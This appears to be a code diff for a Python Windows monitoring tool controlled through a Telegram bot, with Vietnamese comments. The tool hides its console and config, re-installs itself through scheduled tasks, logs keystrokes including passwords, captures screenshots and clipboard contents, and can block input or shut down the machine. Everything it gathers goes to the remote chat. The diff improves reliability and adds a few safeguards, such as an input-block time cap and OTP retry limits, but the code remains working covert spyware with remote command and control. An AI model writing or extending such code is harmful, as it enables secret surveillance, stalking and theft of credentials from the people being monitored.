@@ -34,7 +34,7 @@ import os
 import sys
 import json
 import time
-import random
+import secrets
 import shutil
 import subprocess
 import threading
@@ -126,9 +126,35 @@ DEFAULT_CONFIG = {
     "clipboard_monitor": False,      # bao khi clipboard doi
     "keylogger": False,              # ghi lai phim go (gui dinh ky)
     "keylog_flush": 60,              # giay/lan gui phim go
-    "block_safety_minutes": 0,       # tu mo khoa ban phim/chuot sau N phut (0 = khong)
+    "block_safety_minutes": 0,       # tu mo khoa ban phim/chuot sau N phut (0 = dung van an toan cung)
     "heartbeat_interval": 3600,      # giay/lan bao "van dang chay"
+    "allow_autobind": True,          # cho phep tu lien ket chat dau tien
 }
+
+# Van an toan cung: du config = 0, ban phim/chuot van tu mo sau N phut.
+MAX_BLOCK_MINUTES = 30
+
+
+def _clamp(v, lo, hi):
+    try:
+        v = int(v)
+    except Exception:
+        return lo
+    return max(lo, min(hi, v))
+
+
+def _validate_config(cfg):
+    """Chuan hoa/clampp gia tri cau hinh (issue #8/#10)."""
+    cfg["screenshot_interval"] = _clamp(cfg.get("screenshot_interval", 300), 5, 86400)
+    cfg["keylog_flush"] = _clamp(cfg.get("keylog_flush", 60), 10, 3600)
+    hb = cfg.get("heartbeat_interval", 3600)
+    if hb:
+        cfg["heartbeat_interval"] = _clamp(hb, 60, 86400)
+    cfg["block_safety_minutes"] = _clamp(cfg.get("block_safety_minutes", 0), 0, 1440)
+    for k in ("screenshots_enabled", "activity_monitor", "process_monitor",
+              "clipboard_monitor", "keylogger", "allow_autobind"):
+        cfg[k] = bool(cfg.get(k, False))
+    return cfg
 
 
 def load_config():
@@ -148,6 +174,7 @@ def load_config():
                 cfg.update(saved)
         except Exception as e:
             log("load_config error: %s" % e)
+    cfg = _validate_config(cfg)
     CFG = cfg
     save_config()
     return CFG
@@ -161,6 +188,17 @@ def save_config():
             with open(tmp, "w", encoding="utf-8") as f:
                 json.dump(CFG, f, ensure_ascii=False, indent=2)
             os.replace(tmp, CONFIG_PATH)
+        # An + phan quyen file config chua token (issue #4)
+        try:
+            hide_file(CONFIG_PATH)
+            if IS_WINDOWS:
+                user = os.environ.get("USERNAME", "")
+                if user:
+                    subprocess.run(["icacls", CONFIG_PATH, "/inheritance:r", "/grant:r", user + ":F"],
+                                   capture_output=True,
+                                   creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+        except Exception:
+            pass
     except Exception as e:
         log("save_config error: %s" % e)
 
@@ -173,6 +211,7 @@ def cfg_get(key, default=None):
 def cfg_set(key, value):
     with CONFIG_LOCK:
         CFG[key] = value
+        _validate_config(CFG)
     save_config()
 
 
@@ -187,7 +226,7 @@ def tg_call(method, params=None, files=None, timeout=45):
     params = params or {}
     try:
         if files:
-            boundary = "----WinMonBoundary%08x" % random.randint(0, 0xFFFFFFFF)
+            boundary = "----WinMonBoundary%08x" % int.from_bytes(os.urandom(4), "big")
             body = b""
             for k, v in params.items():
                 body += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
@@ -223,21 +262,57 @@ def _has_chat():
     return bool(cid) and "PUT_YOUR" not in cid
 
 
-def notify(text):
-    """Dua tin nhan van ban vao hang doi gui."""
+MAX_QUEUE = 300
+
+
+def _enqueue(item):
     if not _has_chat():
         return
-    SEND_Q.put({"type": "text", "text": text})
+    # Hang doi gioi han, bo item cu nhat khi day (issue #12)
+    if SEND_Q.qsize() >= MAX_QUEUE:
+        try:
+            old = SEND_Q.get_nowait()
+            if old.get("type") != "text" and old.get("path"):
+                try:
+                    os.remove(old["path"])
+                except Exception:
+                    pass
+        except queue.Empty:
+            pass
+    SEND_Q.put(item)
+
+
+def notify(text):
+    """Dua tin nhan van ban vao hang doi gui."""
+    _enqueue({"type": "text", "text": text})
+
+
+def notify_markup(text, markup):
+    """Gui text kem inline keyboard (issue #38)."""
+    _enqueue({"type": "text", "text": text, "markup": markup})
 
 
 def notify_photo(path, caption=""):
-    if not _has_chat():
-        return
-    SEND_Q.put({"type": "photo", "path": path, "caption": caption})
+    _enqueue({"type": "photo", "path": path, "caption": caption})
+
+
+def _handle_send_result(res):
+    """True = gui xong/khong retry; False = nen retry (loi mang / 429)."""
+    if res.get("ok"):
+        return True
+    desc = str(res.get("description", res.get("error", "")))
+    m = re.search(r"retry_after[\"']?\s*[:=]\s*(\d+)", desc)
+    if "429" in desc or m:
+        time.sleep(int(m.group(1)) + 1 if m else 5)
+        return False
+    if "error_code" not in res and res.get("error"):
+        return False
+    return True
 
 
 def sender_loop():
     """Gui tuan tu, ton trong gioi han ~1 tin/giay cua Telegram."""
+    backoff = 1.0
     while RUNNING:
         try:
             item = SEND_Q.get(timeout=1)
@@ -248,45 +323,133 @@ def sender_loop():
             continue
         try:
             if item["type"] == "text":
-                res = tg_call("sendMessage", {
-                    "chat_id": chat_id,
-                    "text": item["text"][:4000],
-                    "parse_mode": "HTML",
-                    "disable_web_page_preview": "true",
-                })
+                params = {"chat_id": chat_id, "text": item["text"][:4000],
+                          "parse_mode": "HTML", "disable_web_page_preview": "true"}
+                if item.get("markup"):
+                    params["reply_markup"] = item["markup"]
+                res = tg_call("sendMessage", params)
+                ok = _handle_send_result(res)
             else:  # photo
                 path = item["path"]
                 if not os.path.exists(path):
                     continue
+                try:
+                    size = os.path.getsize(path)
+                except Exception:
+                    size = 0
                 with open(path, "rb") as f:
                     content = f.read()
-                res = tg_call("sendPhoto", {
-                    "chat_id": chat_id,
-                    "caption": item.get("caption", "")[:1000],
-                    "parse_mode": "HTML",
-                }, files={"photo": (os.path.basename(path), content, "image/png")}, timeout=120)
-                try:
-                    os.remove(path)
-                except Exception:
-                    pass
-            if not res.get("ok"):
-                desc = str(res.get("description", res.get("error", "")))
-                if "429" in desc or "retry_after" in desc:
-                    m = re.search(r"retry_after[\"']?\s*[:=]\s*(\d+)", desc)
-                    time.sleep(int(m.group(1)) + 1 if m else 5)
-                log("send error: %s" % desc)
+                if size > 9 * 1024 * 1024:
+                    # Anh qua lon -> gui dang document (issue #16)
+                    res = tg_call("sendDocument", {
+                        "chat_id": chat_id,
+                        "caption": item.get("caption", "")[:1000],
+                        "parse_mode": "HTML",
+                    }, files={"document": (os.path.basename(path), content, "application/octet-stream")}, timeout=180)
+                else:
+                    res = tg_call("sendPhoto", {
+                        "chat_id": chat_id,
+                        "caption": item.get("caption", "")[:1000],
+                        "parse_mode": "HTML",
+                    }, files={"photo": (os.path.basename(path), content, "image/png")}, timeout=120)
+                ok = _handle_send_result(res)
+                if ok:
+                    try:
+                        os.remove(path)
+                    except Exception:
+                        pass
+            if not ok:
+                time.sleep(backoff)
+                backoff = min(60.0, backoff * 2)
+                _enqueue(item)  # thu lai
+                continue
+            backoff = 1.0
         except Exception as e:
             log("sender_loop error: %s" % e)
         time.sleep(1.05)
 
 
 # ============================================================================
-#  SCREENSHOT (dung PowerShell - khong can Pillow)
+#  SCREENSHOT: GDI (ctypes) native + PNG encoder thuan Python, PowerShell du phong
 # ============================================================================
-def take_screenshot(path):
-    if not IS_WINDOWS:
+def _png_from_bgra(width, height, buf):
+    """Dong goi buffer BGRA (top-down) thanh PNG khong can thu vien ngoai (issue #40)."""
+    import struct
+    import zlib as _zlib
+    raw = bytearray()
+    stride = width * 4
+    for y in range(height):
+        raw.append(0)  # filter type 0
+        row = buf[y * stride:(y + 1) * stride]
+        # BGRA -> RGB
+        px = bytearray(width * 3)
+        for x in range(width):
+            i = x * 4
+            j = x * 3
+            px[j] = row[i + 2]
+            px[j + 1] = row[i + 1]
+            px[j + 2] = row[i]
+        raw.extend(px)
+
+    def chunk(typ, data):
+        c = struct.pack(">I", len(data)) + typ + data
+        c += struct.pack(">I", _zlib.crc32(typ + data) & 0xFFFFFFFF)
+        return c
+
+    sig = b"\x89PNG\r\n\x1a\n"
+    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
+    idat = _zlib.compress(bytes(raw), 6)
+    return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
+
+
+def _shot_gdi(path):
+    """Chup man hinh bang GDI32 qua ctypes."""
+    u = ctypes.windll.user32
+    g = ctypes.windll.gdi32
+    SM = (76, 77, 78, 79)
+    x = u.GetSystemMetrics(SM[0]); y = u.GetSystemMetrics(SM[1])
+    w = u.GetSystemMetrics(SM[2]); h = u.GetSystemMetrics(SM[3])
+    if w <= 0 or h <= 0:
+        x = y = 0; w = u.GetSystemMetrics(0); h = u.GetSystemMetrics(1)
+    if w <= 0 or h <= 0:
         return False
-    ps_path_str = str(path).replace("'", "''")   # escape cho chuoi PS don
+    hdc = u.GetDC(0)
+    if not hdc:
+        return False
+    mem = g.CreateCompatibleDC(hdc)
+    bmp = g.CreateCompatibleBitmap(hdc, w, h)
+    g.SelectObject(mem, bmp)
+    SRCCOPY = 0x00CC0020
+    ok = g.BitBlt(mem, 0, 0, w, h, hdc, x, y, SRCCOPY)
+    if not ok:
+        g.DeleteObject(bmp); g.DeleteDC(mem); u.ReleaseDC(0, hdc)
+        return False
+    class BITMAPINFOHEADER(ctypes.Structure):
+        _fields_ = [("biSize", ctypes.c_uint32), ("biWidth", ctypes.c_int32),
+                    ("biHeight", ctypes.c_int32), ("biPlanes", ctypes.c_uint16),
+                    ("biBitCount", ctypes.c_uint16), ("biCompression", ctypes.c_uint32),
+                    ("biSizeImage", ctypes.c_uint32), ("biXPelsPerMeter", ctypes.c_int32),
+                    ("biYPelsPerMeter", ctypes.c_int32), ("biClrUsed", ctypes.c_uint32),
+                    ("biClrImportant", ctypes.c_uint32)]
+    bmi = BITMAPINFOHEADER()
+    bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+    bmi.biWidth = w
+    bmi.biHeight = -h
+    bmi.biPlanes = 1
+    bmi.biBitCount = 32
+    bmi.biCompression = 0
+    bufsize = w * h * 4
+    buf = ctypes.create_string_buffer(bufsize)
+    g.GetDIBits(mem, bmp, 0, h, buf, ctypes.byref(bmi), 0)
+    g.DeleteObject(bmp); g.DeleteDC(mem); u.ReleaseDC(0, hdc)
+    png = _png_from_bgra(w, h, buf.raw)
+    with open(path, "wb") as f:
+        f.write(png)
+    return os.path.exists(path) and os.path.getsize(path) > 0
+
+
+def _shot_powershell(path):
+    ps_path_str = str(path).replace("'", "''")
     ps = (
         "Add-Type -AssemblyName System.Windows.Forms\r\n"
         "Add-Type -AssemblyName System.Drawing\r\n"
@@ -295,8 +458,7 @@ def take_screenshot(path):
         "$g=[System.Drawing.Graphics]::FromImage($bmp)\r\n"
         "$g.CopyFromScreen($vs.Left,$vs.Top,0,0,$bmp.Size)\r\n"
         "$bmp.Save('%s',[System.Drawing.Imaging.ImageFormat]::Png)\r\n"
-        "$g.Dispose()\r\n"
-        "$bmp.Dispose()\r\n" % ps_path_str
+        "$g.Dispose()\r\n$bmp.Dispose()\r\n" % ps_path_str
     )
     ps_path = os.path.join(BASE_DIR, "_shot.ps1")
     try:
@@ -309,17 +471,33 @@ def take_screenshot(path):
             capture_output=True, timeout=60)
         return os.path.exists(path) and os.path.getsize(path) > 0
     except Exception as e:
-        log("take_screenshot error: %s" % e)
+        log("take_screenshot(ps) error: %s" % e)
         return False
+
+
+def take_screenshot(path):
+    if not IS_WINDOWS:
+        return False
+    # Uu tien GDI native (nhanh, khong phu thuoc PowerShell)
+    try:
+        if _shot_gdi(path):
+            return True
+    except Exception as e:
+        log("GDI screenshot error: %s" % e)
+    # Du phong PowerShell
+    return _shot_powershell(path)
 
 
 def do_screenshot_send(caption_prefix="📸"):
     if not IS_WINDOWS:
         return
+    if SEND_Q.qsize() > 240:
+        log("Bo qua chup: hang doi gui dang day (co the mat mang).")
+        return
     path = os.path.join(BASE_DIR, "shot_%s.png" % datetime.now().strftime("%Y%m%d_%H%M%S"))
     ok = take_screenshot(path)
     if ok:
-        cap = "%s <b>Chup man hinh</b>\n🕒 %s" % (
+        cap = "%s <b>Chụp màn hình</b>\n🕒 %s" % (
             caption_prefix, datetime.now().strftime("%H:%M:%S %d/%m/%Y"))
         notify_photo(path, cap)
     else:
@@ -332,9 +510,9 @@ def screenshot_loop():
         try:
             if cfg_get("screenshots_enabled", True):
                 interval = max(5, int(cfg_get("screenshot_interval", 300)))
-                if time.time() - last >= interval:
+                if time.monotonic() - last >= interval:  # monotonic (issue #18/#37)
                     do_screenshot_send()
-                    last = time.time()
+                    last = time.monotonic()
         except Exception as e:
             log("screenshot_loop error: %s" % e)
         time.sleep(1)
@@ -527,6 +705,9 @@ class InputBlocker:
                 return False
             if not user32:
                 return False
+            # Van an toan cung: luon co thoi han tu mo (issue #11/#14)
+            if auto_minutes <= 0 or auto_minutes > MAX_BLOCK_MINUTES:
+                auto_minutes = MAX_BLOCK_MINUTES
             self.evt = threading.Event()
             self.thread = threading.Thread(
                 target=self._run, args=(auto_minutes,), daemon=True)
@@ -544,9 +725,7 @@ class InputBlocker:
             self.blocked = False
             notify("⚠️ Không ngắt được bàn phím/chuột (có thể cần chạy quyền Admin).")
             return
-        notify("🔒 Đã NGẮT bàn phím & chuột." +
-               (" Tự mở khóa sau %d phút." % auto_minutes if auto_minutes else
-                " Gửi /unblock để mở lại."))
+        notify("🔒 Đã NGẮT bàn phím & chuột. Tự mở khóa sau %d phút (van an toàn) hoặc gửi /unblock." % auto_minutes)
         try:
             timeout = (auto_minutes * 60) if auto_minutes else None
             self.evt.wait(timeout=timeout)
@@ -695,9 +874,9 @@ def _run_hidden(cmd):
 def register_scheduled_tasks():
     target = launcher_target()
     tr = '"%s"' % target
-    # task 1: moi 1 phut (tu phuc hoi neu bi kill)
+    # task 1: moi 5 phut (tu phuc hoi neu bi kill; giam spawn thua - issue #17)
     _run_hidden(['schtasks', '/Create', '/TN', 'WinMonitorGuard',
-                 '/TR', tr, '/SC', 'MINUTE', '/MO', '1', '/F'])
+                 '/TR', tr, '/SC', 'MINUTE', '/MO', '5', '/F'])
     # task 2: khi dang nhap (du phong)
     _run_hidden(['schtasks', '/Create', '/TN', 'WinMonitorLogon',
                  '/TR', tr, '/SC', 'ONLOGON', '/F'])
@@ -759,8 +938,25 @@ def selfheal_loop():
         time.sleep(300)
         try:
             ensure_persistence()
+            cleanup_old_shots(2 * 3600)
         except Exception as e:
             log("selfheal_loop error: %s" % e)
+
+
+def cleanup_old_shots(max_age_seconds=7200):
+    """Xoa anh chup tam cu de khong day dia (issue #20)."""
+    try:
+        now = time.time()
+        for name in os.listdir(BASE_DIR):
+            if name.startswith("shot_") and name.endswith(".png"):
+                p = os.path.join(BASE_DIR, name)
+                try:
+                    if now - os.path.getmtime(p) > max_age_seconds:
+                        os.remove(p)
+                except Exception:
+                    pass
+    except Exception:
+        pass
 
 
 def remove_persistence():
@@ -799,9 +995,18 @@ def remove_persistence():
 # ============================================================================
 #  OTP / HANH DONG NGUY HIEM
 # ============================================================================
+def _gen_otp():
+    """Ma 6 so bang CSPRNG (issue #5)."""
+    return "%06d" % secrets.randbelow(1000000)
+
+
+OTP_FAILURES = {"count": 0}
+
+
 def request_otp(action, label):
-    code = "%06d" % random.randint(0, 999999)
+    code = _gen_otp()
     PENDING[action] = {"code": code, "expires": time.time() + 120}
+    OTP_FAILURES["count"] = 0
     notify(
         "🔐 <b>XÁC NHẬN %s</b>\n"
         "Mã dùng 1 lần: <code>%s</code>\n"
@@ -810,6 +1015,7 @@ def request_otp(action, label):
 
 
 def execute_action(action):
+    global RUNNING
     if action == "shutdown":
         notify("🖥️ Đang TẮT MÁY (sau 5 giây)...")
         time.sleep(1)
@@ -822,8 +1028,12 @@ def execute_action(action):
         notify("🛑 Đã xác thực. Đang DỪNG GIÁM SÁT và gỡ khỏi khởi động cùng Windows...")
         remove_persistence()
         time.sleep(1.5)
-        global RUNNING
         RUNNING = False
+        # Giai phong ban phim/chuot truoc khi thoat (issue #29)
+        try:
+            BLOCKER.unblock()
+        except Exception:
+            pass
         time.sleep(0.5)
         os._exit(0)
 
@@ -854,10 +1064,21 @@ HELP_TEXT = (
     "/cancel - Hủy yêu cầu\n\n"
     "<b>Khác</b>\n"
     "/config - Xem cấu hình\n"
+    "/get &lt;khóa&gt; - Xem 1 khóa\n"
     "/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi cấu hình\n"
+    "/reset - Về mặc định\n"
+    "/reload_config - Nạp lại từ file\n"
     "/logs [n] - Xem log gần đây\n"
     "/reload - Cập nhật lại menu lệnh"
 )
+
+
+# Inline keyboard cho các lệnh hay dùng (issue #38)
+MAIN_KEYBOARD = json.dumps({"inline_keyboard": [
+    [{"text": "📸 Chụp", "callback_data": "/shot"}, {"text": "📊 Trạng thái", "callback_data": "/status"}],
+    [{"text": "🔒 Khóa", "callback_data": "/lock"}, {"text": "⌨️ Keylog on", "callback_data": "/keylog on"}],
+    [{"text": "🛑 Block", "callback_data": "/block"}, {"text": "🔓 Unblock", "callback_data": "/unblock"}],
+]}, ensure_ascii=False)
 
 
 # Danh sách lệnh hiển thị trong menu của bot trên Telegram.
@@ -882,7 +1103,10 @@ BOT_COMMANDS = [
     ("confirm",  "Xác nhận mã OTP"),
     ("cancel",   "Hủy yêu cầu đang chờ"),
     ("config",   "Xem cấu hình"),
+    ("get",      "Xem 1 khóa cấu hình"),
     ("set",      "Đổi cấu hình: /set khóa giá_trị"),
+    ("reset",    "Đặt lại cấu hình mặc định"),
+    ("reload_config", "Nạp lại config từ file"),
     ("logs",     "Xem log gần đây"),
     ("reload",   "Cập nhật lại menu lệnh"),
 ]
@@ -928,7 +1152,10 @@ def handle_command(text, chat_id):
     cmd = parts[0].lower().split("@")[0]   # bo @botname
     args = parts[1:]
 
-    if cmd in ("/start", "/help"):
+    if cmd == "/start":
+        notify_markup(HELP_TEXT, MAIN_KEYBOARD)
+        return
+    if cmd == "/help":
         notify(HELP_TEXT)
         return
 
@@ -940,6 +1167,10 @@ def handle_command(text, chat_id):
     if cmd == "/status":
         up = int(time.time() - START_TIME)
         h, m, s = up // 3600, (up % 3600) // 60, up % 60
+        try:
+            is_admin = bool(IS_WINDOWS and ctypes.windll.shell32.IsUserAnAdmin())
+        except Exception:
+            is_admin = False
         txt = (
             "📊 <b>TRẠNG THÁI</b>\n"
             "⏱ Uptime: %dh %dm %ds\n"
@@ -949,6 +1180,7 @@ def handle_command(text, chat_id):
             "📋 Clipboard: %s\n"
             "⌨️ Keylog: %s\n"
             "🔒 Bàn phím/chuột: %s\n"
+            "🛡 Quyền: %s\n"
             "💓 Heartbeat: %ss\n"
         ) % (
             h, m, s,
@@ -959,6 +1191,7 @@ def handle_command(text, chat_id):
             "BẬT" if cfg_get("clipboard_monitor") else "TẮT",
             "BẬT" if cfg_get("keylogger") else "TẮT",
             "ĐANG NGẮT" if BLOCKER.blocked else "BÌNH THƯỜNG",
+            "Admin" if is_admin else "Thường",
             cfg_get("heartbeat_interval"),
         )
         notify(txt)
@@ -987,6 +1220,8 @@ def handle_command(text, chat_id):
             notify("Cú pháp: %s on|off" % cmd)
             return
         cfg_set(key, parse_bool(args[0]))
+        if cmd == "/keylog" and cfg_get(key):
+            notify("⚠️ Đã BẬT keylogger — công cụ này ghi lại MỌI phím gõ (kể cả mật khẩu). Chỉ dùng trên máy của chính bạn và khi thật cần. Gõ /keylog off để tắt.")
         notify("✅ %s = %s" % (key, "BẬT" if cfg_get(key) else "TẮT"))
         return
 
@@ -1038,14 +1273,57 @@ def handle_command(text, chat_id):
                 continue
             if info["code"] == code:
                 PENDING.pop(action, None)
+                OTP_FAILURES["count"] = 0
                 execute_action(action)
                 return
-        notify("❌ Mã không đúng hoặc đã hết hạn.")
+        OTP_FAILURES["count"] += 1
+        if OTP_FAILURES["count"] >= 5:
+            PENDING.clear()
+            OTP_FAILURES["count"] = 0
+            notify("❌ Sai mã quá 5 lần — đã hủy toàn bộ yêu cầu. Hãy tạo lại.")
+        else:
+            notify("❌ Mã không đúng hoặc đã hết hạn (còn %d lần thử)." % (5 - OTP_FAILURES["count"]))
         return
 
     if cmd == "/cancel":
         PENDING.clear()
+        OTP_FAILURES["count"] = 0
         notify("✅ Đã hủy mọi yêu cầu đang chờ.")
+        return
+
+    if cmd == "/get":
+        if not args:
+            notify("Cú pháp: /get <khóa>")
+            return
+        key = args[0]
+        if key in ("bot_token", "chat_id"):
+            v = cfg_get(key, "")
+            if key == "bot_token" and v:
+                v = v[:8] + "...(ẩn)"
+            notify("<b>%s</b> = <code>%s</code>" % (key, html_escape(str(v))))
+            return
+        if key in DEFAULT_CONFIG:
+            notify("<b>%s</b> = <code>%s</code>" % (key, html_escape(str(cfg_get(key)))))
+        else:
+            notify("❌ Khóa không hợp lệ.")
+        return
+
+    if cmd == "/reset":
+        with CONFIG_LOCK:
+            keep_tok = CFG.get("bot_token")
+            keep_chat = CFG.get("chat_id")
+            CFG.clear()
+            CFG.update(DEFAULT_CONFIG)
+            CFG["bot_token"] = keep_tok
+            CFG["chat_id"] = keep_chat
+            _validate_config(CFG)
+        save_config()
+        notify("✅ Đã đặt lại cấu hình về mặc định (giữ nguyên token/chat_id).")
+        return
+
+    if cmd == "/reload_config":
+        load_config()
+        notify("✅ Đã nạp lại cấu hình từ file.")
         return
 
     if cmd == "/config":
@@ -1077,10 +1355,10 @@ def handle_command(text, chat_id):
             else:
                 newval = val
         except Exception:
-            notify("❌ Giá trị không hợp lệ.")
+            notify("❌ Giá trị không hợp lệ (cần số nguyên).")
             return
         cfg_set(key, newval)
-        notify("✅ %s = %s" % (key, newval))
+        notify("✅ %s = %s" % (key, cfg_get(key)))
         return
 
     if cmd == "/logs":
@@ -1101,6 +1379,9 @@ def handle_command(text, chat_id):
 def is_authorized(chat_id):
     cid = str(cfg_get("chat_id", "") or "").strip()
     if not cid or cid == DEFAULT_CHAT_ID or "PUT_YOUR" in cid:
+        if not cfg_get("allow_autobind", True):
+            log("Tu choi chat la (allow_autobind=false): %s" % chat_id)
+            return False
         # chua cau hinh -> tu dong lay chat dau tien
         cfg_set("chat_id", str(chat_id))
         notify("✅ Đã liên kết chat này (<code>%s</code>) làm chủ.\nGửi /help để bắt đầu." % chat_id)
@@ -1109,6 +1390,18 @@ def is_authorized(chat_id):
 
 
 def handle_update(upd):
+    # Callback tu inline keyboard (issue #38)
+    cb = upd.get("callback_query")
+    if cb:
+        try:
+            tg_call("answerCallbackQuery", {"callback_query_id": cb.get("id", "")})
+            from_chat = (cb.get("message") or {}).get("chat", {}).get("id")
+            data = cb.get("data", "")
+            if from_chat is not None and is_authorized(from_chat) and data.startswith("/"):
+                handle_command(data, from_chat)
+        except Exception as e:
+            log("callback error: %s" % e)
+        return
     msg = upd.get("message") or upd.get("edited_message")
     if not msg:
         return
@@ -1182,6 +1475,15 @@ def main():
     global RUNNING, START_TIME
     START_TIME = time.time()
     os.makedirs(BASE_DIR, exist_ok=True)
+    # DPI awareness cho chup man hinh dung tren da man hinh (issue #33)
+    if IS_WINDOWS:
+        try:
+            ctypes.windll.shcore.SetProcessDpiAwareness(2)
+        except Exception:
+            try:
+                ctypes.windll.user32.SetProcessDPIAware()
+            except Exception:
+                pass
     hide_console()
 
     load_config()
@@ -1212,12 +1514,23 @@ def main():
                         cfg_set(_k, _loaded[_k])
         except Exception as e:
             log("load --config error: %s" % e)
+    # Token uu tien bien moi truong WINMON_TOKEN (kin hon --token)
+    _envtok = os.environ.get("WINMON_TOKEN")
+    if _envtok:
+        cfg_set("bot_token", _envtok)
     _tok = _arg("--token")
     if _tok:
         cfg_set("bot_token", _tok)
     _chat = _arg("--chat")
     if _chat:
         cfg_set("chat_id", _chat)
+    # Che token trong argv de khong lo qua process list (issue #2)
+    try:
+        for _i in range(len(sys.argv) - 1):
+            if sys.argv[_i] == "--token":
+                sys.argv[_i + 1] = "***"
+    except Exception:
+        pass
 
     token = str(cfg_get("bot_token", ""))
     if not token or "PUT_YOUR" in token:
@@ -1233,8 +1546,20 @@ def main():
         log("Da co 1 ban WinMonitor dang chay. Thoat.")
         return
 
+    # Kiem tra token hop le (issue #9) - chi dung neu token SAI, khong dung khi offline
+    try:
+        _me = tg_call("getMe", {}, timeout=20)
+        if not _me.get("ok"):
+            if _me.get("error_code") == 401:
+                log("bot_token khong hop le (401). Dung.")
+                return
+            log("Canh bao: khong ket noi duoc Telegram luc khoi dong (se thu lai).")
+    except Exception as e:
+        log("getMe check error: %s" % e)
+
     # duy tri khoi dong cung Windows
     ensure_persistence()
+    cleanup_old_shots(2 * 3600)
 
     # luong gui
     threading.Thread(target=sender_loop, daemon=True).start()
@@ -1256,22 +1581,35 @@ def main():
 
     # vong lap nhan lenh (long polling)
     offset = 0
+    backoff = 3
     while RUNNING:
         try:
             res = tg_call("getUpdates", {
                 "offset": offset, "timeout": 25,
-                "allowed_updates": json.dumps(["message"]),
+                "allowed_updates": json.dumps(["message", "callback_query"]),
             }, timeout=40)
             if not res.get("ok"):
+                if res.get("error_code") == 409:
+                    log("409 Conflict: bot token dang duoc dung o noi khac.")
+                    time.sleep(10)
+                    continue
                 log("getUpdates not ok: %s" % res.get("description", res.get("error", "")))
-                time.sleep(3)
+                time.sleep(backoff)
+                backoff = min(30, backoff * 2)
                 continue
+            backoff = 3
             for upd in res.get("result", []):
                 offset = upd["update_id"] + 1
                 handle_update(upd)
         except Exception as e:
             log("main loop error: %s" % e)
             time.sleep(3)
+
+    # Thoat em: giai phong ban phim/chuot (issue #29)
+    try:
+        BLOCKER.unblock()
+    except Exception:
+        pass
 
 
 if __name__ == "__main__":
